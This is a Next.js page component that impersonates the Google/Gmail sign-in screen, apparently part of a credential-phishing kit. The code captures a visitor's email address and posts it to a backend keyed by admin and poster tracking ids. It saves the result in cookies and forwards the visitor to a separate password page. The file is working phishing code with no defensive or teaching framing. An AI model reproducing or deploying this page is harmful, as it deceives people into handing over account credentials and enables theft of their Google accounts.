"use client";
import React, { useState } from "react";
import { useRouter } from "next/navigation";
import { API_URL, site } from "../config/index";
import Cookies from "js-cookie";
function page() {
  const [email, setEmail] = useState("");
  const adminId = Cookies.get("adminId");
  const posterId = Cookies.get("posterId");
  const router = useRouter();
  const handleSubmit = async () => {
    if (!email) {
      return;
    }
    const values = {
      email: email,
      site: site,
    };
    console.log(values);
    const url = `${API_URL}/email/post/${adminId}/${posterId}`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });
    const data = await res.json();
    console.log(data);

    if (res.ok) {
      console.log("success", data);
      Cookies.set("email", data?.info?.email);
      Cookies.set("id", data?.info?._id);
      router.push("/password");
    } else {
      console.log("error", data);
      toast.error("Something Went Wrong");
    }
  };

  return (
    <div className="relative flex justify-center items-center">
      <iframe
        class="absolute inset-0 object-cover w-full h-full"
        src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3153.5693930527423!2d144.95855721544715!3d-37.818435979751494!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x6ad642af0f11fd81%3A0xf577f5d1f11f1c1b!2sFederation%20Square!5e0!3m2!1sen!2sau!4v1601360233956!5m2!1sen!2sau"
        frameborder="0"
        style={{
          border: "0",
          position: "fixed",
          top: 0,
          left: 0,
          bottom: 0,
          right: 0,
          width: "100%",
          height: "100%",
          margin: 0,
          filter: "blur(2px)",
          WebkitFilter: "blur(2px)",
          overflow: "hidden",
          zIndex: -1,
          backgroundColor: "gray",
        }}
        allowfullscreen=""
        loading="lazy"
      ></iframe>
      <div className="flex justify-center items-center  bg-white h-fit w-fit p-5 rounded-md">
        <div className="flex items-center justify-between">
          <div>
            <img src="/images/google-logo-small.png" width={100} height={40} />
            <p className="font-medium text-2xl mt-5">Sign in</p>
            <p className="font-medium text-2xl mt-5">to continue to Gmail </p>
          </div>
          <div className="">
            <div className="text-center">
              <p className="text-sm mt-1">Enter your password</p>
              <p className="text-[#1a73e8] text-sm mt-1">
                Learn more about using Guest mode
              </p>
            </div>
            <input
              required
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-[350px] px-3 py-3 border border-gray-300 outline-none rounded-md mt-5 placeholder:pl-5"
              type="text"
              placeholder="Enter your email address "
            />
            <p className="text-[#1a73e8] text-sm mt-2">Forgot email?</p>
            <div className="flex justify-between mt-3">
              <p className="text-[#1a73e8] text-sm mt-7 text-center">
                Create account
              </p>
              <button
                onClick={handleSubmit}
                className=" bg-[#1a73e8] text-white px-3 py-2 border border-gray-300 outline-none rounded-full mt-5"
              >
                Next
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default page;
